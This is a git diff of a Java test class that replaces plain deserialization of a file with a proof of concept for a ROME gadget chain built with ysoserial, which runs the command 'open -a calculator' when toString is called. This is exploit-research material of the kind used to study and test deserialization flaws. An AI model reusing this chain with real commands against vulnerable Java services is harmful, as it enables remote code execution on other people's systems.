@@ -1,8 +1,11 @@
 package top.lz2y.test;
 
 
+import com.sun.syndication.feed.impl.ObjectBean;
 import top.lz2y.tools.FileUtil;
+import ysoserial.payloads.util.Gadgets;
 
+import javax.xml.transform.Templates;
 import java.io.ByteArrayInputStream;
 import java.io.ObjectInputStream;
 
@@ -14,11 +17,9 @@ import java.io.ObjectInputStream;
  */
 public class ByteTest {
     public static void main(String[] args) throws Exception{
-//        System.out.println("Test");
-        byte[] payload = FileUtil.getBytesByFile("src\\main\\java\\top\\lz2y\\1.ser");
-        assert payload != null;
-        ObjectInputStream ois = new ObjectInputStream(new
-                ByteArrayInputStream(payload));
-        ois.readObject();
+        Object o = Gadgets.createTemplatesImpl("open -a calculator");
+        ObjectBean delegate = new ObjectBean(Templates.class, o);
+//        ObjectBean root = new ObjectBean(ObjectBean.class, delegate);
+        delegate.toString();
     }
 }
